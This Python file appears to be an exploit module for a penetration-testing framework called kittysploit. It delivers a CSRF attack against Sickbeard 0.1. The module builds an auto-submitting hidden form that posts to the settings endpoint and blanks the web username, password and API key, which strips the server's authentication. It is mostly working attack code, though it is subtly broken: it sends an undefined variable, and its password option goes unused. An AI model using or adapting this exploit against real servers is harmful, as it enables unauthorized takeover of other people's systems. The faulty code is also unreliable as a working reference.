from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "Sickbeard 0.1 csrf",
		"description": "Sickbeard 0.1 csrf",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target URL (with http://)", required=True)
	port = OptPort(8081, "Target HTTP port", required=True)
	password = OptString("pwned", "Change password", required=True)

	
	def run(self):
		data = [f'<form method="POST" action="{self.target}:{self.port}/config/general/saveGeneral">',
			f'<input type="hidden" name="log_dir" value="Logs" />',
			f'<input type="hidden" name="web_port" value="{self.port}" />',
			f'<input type="hidden" name="web_username" value="" />',
			f'<input type="hidden" name="web_password" value="" />',
			f'<input type="hidden" name="https_cert" value="server.crt" />',
			f'<input type="hidden" name="https_key" value="server.key" />',
			f'<input type="hidden" name="api_key" value="" />',
			f'<input type="submit" value="submit request" />',
			'</form>']
			
		js = self.csrf_post_and_submit(data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
